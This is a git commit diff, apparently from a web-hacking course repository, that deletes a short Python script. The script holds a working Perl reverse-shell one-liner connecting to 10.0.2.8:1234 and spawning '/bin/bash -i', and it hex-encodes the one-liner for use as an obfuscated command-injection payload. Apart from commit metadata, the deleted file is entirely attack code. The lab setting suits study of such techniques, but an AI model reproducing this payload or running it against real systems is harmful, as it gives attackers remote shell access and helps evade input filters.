41db07f020140935d9f06c33d386cb1947c0cf96
Jonatan Gomez Garcia <jonatanswdev@proton.me>
2024-04-22 12:11:43 +0200

    Asignatura finalizada

--- 03 Hacking Web/Data/Command Injection/hexadecimal_encode.py
+++
@@ -1,3 +0,0 @@
-s = 'use Socket;$i="10.0.2.8";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
-a = s.encode("utf-8").hex()
-print (a)
